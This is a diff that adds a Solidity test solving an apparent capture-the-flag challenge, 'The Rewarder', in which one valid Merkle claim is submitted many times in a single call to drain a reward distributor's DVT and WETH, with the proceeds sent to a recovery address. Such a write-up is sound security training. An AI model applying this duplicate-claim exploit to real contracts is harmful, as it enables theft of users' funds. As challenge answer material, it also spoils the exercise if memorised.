@@ -148,7 +148,46 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        (uint256 playerDvtIndex, uint256 playerDvtAmount) = _findReward("/test/the-rewarder/dvt-distribution.json", player);
+        (uint256 playerWethIndex, uint256 playerWethAmount) = _findReward("/test/the-rewarder/weth-distribution.json", player);
+
+        uint256 dvtClaimsCount = distributor.getRemaining(address(dvt)) / playerDvtAmount;
+        uint256 wethClaimsCount = distributor.getRemaining(address(weth)) / playerWethAmount;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerDvtIndex);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerWethIndex);
+
+        Claim[] memory claims = new Claim[](dvtClaimsCount + wethClaimsCount);
+
+        for (uint256 i = 0; i < dvtClaimsCount; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: playerDvtAmount,
+                tokenIndex: 0,
+                proof: dvtProof
+            });
+        }
+
+        for (uint256 i = 0; i < wethClaimsCount; i++) {
+            claims[dvtClaimsCount + i] = Claim({
+                batchNumber: 0,
+                amount: playerWethAmount,
+                tokenIndex: 1,
+                proof: wethProof
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -187,5 +226,18 @@ contract TheRewarderChallenge is Test {
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
+    }
+
+    function _findReward(string memory path, address beneficiary) private view returns (uint256 index, uint256 amount) {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+
+        for (uint256 i = 0; i < rewards.length; i++) {
+            if (rewards[i].beneficiary == beneficiary) {
+                return (i, rewards[i].amount);
+            }
+        }
+
+        revert("reward not found");
     }
 }
